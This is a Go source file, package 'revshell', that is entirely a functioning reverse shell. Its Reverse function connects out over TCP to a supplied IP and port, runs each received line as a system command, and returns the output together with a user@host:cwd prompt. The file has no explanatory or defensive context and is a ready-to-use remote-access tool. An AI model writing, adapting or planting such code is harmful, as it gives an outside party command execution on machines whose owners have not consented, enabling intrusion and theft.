package revshell

import (
  "bufio"
  "fmt"
  "net"
  "os/exec"
  "os/user"
  "os"
  "strings"
  "log"
)

func bashFormat() string {
  u, e := user.Current()
  if e != nil {
    log.Fatal(e)
  }
  hostn, _ := os.Hostname()
  cwd, _ := os.Getwd()

  return u.Username + "@" + hostn + ":" + cwd
}

func Reverse(ip string, port string){
  var out []byte
  var err error
  conn, _ := net.Dial("tcp", ip + ":" + port)
  for {
    message, _ := bufio.NewReader(conn).ReadString('\n')
    comm_to_exec := strings.TrimSuffix(message, "\n")
    if len(strings.Split(comm_to_exec, " ")) >= 2 {
      out, err = exec.Command(strings.Split(comm_to_exec, " ")[0], strings.Split(comm_to_exec, " ")[1:]...).Output()
    } else {
      out, err = exec.Command(comm_to_exec).Output()
    }

    if err != nil {
      fmt.Fprintf(conn, "%s\n", err)
    }

    format := bashFormat()
    fmt.Fprintf(conn, "%s\n%v$ ", out, format)
  }
}
